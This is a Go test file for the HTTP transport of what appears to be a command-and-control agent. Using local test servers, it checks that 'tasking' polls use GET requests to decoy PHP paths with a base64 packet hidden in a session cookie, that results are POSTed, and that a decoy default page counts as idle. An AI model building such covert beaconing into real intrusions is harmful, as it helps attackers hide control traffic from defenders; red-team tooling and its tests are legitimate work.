package comms

import (
	"bytes"
	"encoding/base64"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

type recorded struct {
	method, path, cookie, userAgent string
	body                            []byte
}

// newRecorder serves `status` with `body` for every request and records what arrived.
func newRecorder(t *testing.T, status int, body []byte) (*httptest.Server, *[]recorded) {
	t.Helper()
	var seen []recorded
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		seen = append(seen, recorded{r.Method, r.URL.Path, r.Header.Get("Cookie"), r.Header.Get("User-Agent"), b})
		w.WriteHeader(status)
		_, _ = w.Write(body)
	}))
	t.Cleanup(srv.Close)
	return srv, &seen
}

var defaultPage = []byte("<html>default page</html>")
var packet = []byte("\x00\x01routing packet with + and / bytes \xff\xfe")

func TestSend_TaskingIsGETWithConfiguredCookie(t *testing.T) {
	srv, seen := newRecorder(t, 200, defaultPage)
	s := NewHttpMessageSender(srv.URL, map[string]string{"User-Agent": "UA"}, "/admin/get.php,/news.php|UA", "PHPSESSID", defaultPage)

	data, err := s.Send(RequestTasking, packet)
	if err != nil || data != nil {
		t.Fatalf("idle poll: want (nil, nil) got (%q, %v)", data, err)
	}
	r := (*seen)[0]
	if r.method != "GET" || (r.path != "/admin/get.php" && r.path != "/news.php") {
		t.Fatalf("want GET to a task URI, got %s %s", r.method, r.path)
	}
	name, value, _ := strings.Cut(r.cookie, "=")
	if name != "PHPSESSID" {
		t.Errorf("cookie name: want PHPSESSID got %q", name)
	}
	if got, _ := base64.StdEncoding.DecodeString(value); !bytes.Equal(got, packet) {
		t.Errorf("cookie value does not decode to the routing packet")
	}
	if len(r.body) != 0 {
		t.Errorf("GET must have no body")
	}
	if r.userAgent != "UA" {
		t.Errorf("sender headers must reach the wire: User-Agent %q", r.userAgent)
	}
}

func TestSend_EmptyCookieNameDefaultsToSession(t *testing.T) {
	srv, seen := newRecorder(t, 200, defaultPage)
	s := NewHttpMessageSender(srv.URL, nil, "/a.php|UA", "", defaultPage)
	_, _ = s.Send(RequestTasking, packet)
	if !strings.HasPrefix((*seen)[0].cookie, "session=") {
		t.Errorf("want session= cookie, got %q", (*seen)[0].cookie)
	}
}

func TestSend_DataIsPOSTBodyWithoutStaleCookie(t *testing.T) {
	srv, seen := newRecorder(t, 200, defaultPage)
	s := NewHttpMessageSender(srv.URL, nil, "/a.php|UA", "PHPSESSID", defaultPage)
	_, _ = s.Send(RequestTasking, packet) // sets a cookie on this request only
	if _, err := s.Send(RequestData, packet); err != nil {
		t.Fatalf("results POST: %v", err)
	}
	r := (*seen)[1]
	if r.method != "POST" || !bytes.Equal(r.body, packet) {
		t.Errorf("want POST with the packet body, got %s body=%q", r.method, r.body)
	}
	if r.cookie != "" {
		t.Errorf("POST must not carry the previous poll's cookie, got %q", r.cookie)
	}
}

func TestSend_TaskingBodyIsReturnedVerbatim(t *testing.T) {
	srv, _ := newRecorder(t, 200, []byte("TASKING-BYTES"))
	s := NewHttpMessageSender(srv.URL, nil, "/a.php|UA", "", defaultPage)
	data, err := s.Send(RequestTasking, packet)
	if err != nil || string(data) != "TASKING-BYTES" {
		t.Fatalf("got (%q, %v)", data, err)
	}
}

func TestSend_Statuses(t *testing.T) {
	cases := []struct {
		name   string
		status int
		body   []byte
		kind   RequestKind
		want   error // sentinel to errors.Is, or nil for "any http status error"
	}{
		{"401 on poll", 401, defaultPage, RequestTasking, ErrSessionUnknown},
		{"401 on results", 401, defaultPage, RequestData, ErrSessionUnknown},
		{"empty 200 on poll", 200, nil, RequestTasking, ErrEmptyResponse},
		{"500", 500, []byte("boom"), RequestTasking, nil},
		{"404 default page", 404, defaultPage, RequestTasking, nil},
	}
	for _, c := range cases {
		srv, _ := newRecorder(t, c.status, c.body)
		s := NewHttpMessageSender(srv.URL, nil, "/a.php|UA", "", defaultPage)
		_, err := s.Send(c.kind, packet)
		if err == nil {
			t.Errorf("%s: want an error", c.name)
			continue
		}
		if c.want != nil && !errors.Is(err, c.want) {
			t.Errorf("%s: want %v got %v", c.name, c.want, err)
		}
		if c.want == nil && !strings.Contains(err.Error(), "http") {
			t.Errorf("%s: want an http status error, got %v", c.name, err)
		}
	}
}

func TestSend_NoTaskURIsIsAnError(t *testing.T) {
	s := NewHttpMessageSender("http://127.0.0.1:9", nil, "|UA", "", defaultPage)
	if _, err := s.Send(RequestTasking, packet); !errors.Is(err, ErrNoTaskURIs) {
		t.Fatalf("want ErrNoTaskURIs got %v", err)
	}
}

func TestSend_TransportErrorIsReturned(t *testing.T) {
	s := NewHttpMessageSender("http://127.0.0.1:9", nil, "/a.php|UA", "", defaultPage) // nothing listens
	if _, err := s.Send(RequestTasking, packet); err == nil {
		t.Fatal("want a transport error")
	}
}

// An empty 200 is never a valid http-listener answer, even when the sender
// has no default page to compare against (bytes.Equal(nil, empty) is true).
func TestSend_EmptyBodyWithEmptyDefaultPageIsErrEmptyResponse(t *testing.T) {
	srv, _ := newRecorder(t, 200, nil)
	s := NewHttpMessageSender(srv.URL, nil, "/a.php|UA", "", nil)
	if _, err := s.Send(RequestTasking, packet); !errors.Is(err, ErrEmptyResponse) {
		t.Fatalf("want ErrEmptyResponse got %v", err)
	}
}

// A body that differs from the default page by one byte is tasking, not idle:
// the agent tries to decode it and counts a failure as a miss.
func TestSend_DefaultPagePlusOneByteIsReturnedAsData(t *testing.T) {
	body := append(append([]byte{}, defaultPage...), '\n')
	srv, _ := newRecorder(t, 200, body)
	s := NewHttpMessageSender(srv.URL, nil, "/a.php|UA", "", defaultPage)
	data, err := s.Send(RequestTasking, packet)
	if err != nil || !bytes.Equal(data, body) {
		t.Fatalf("want the body back, got (%q, %v)", data, err)
	}
}
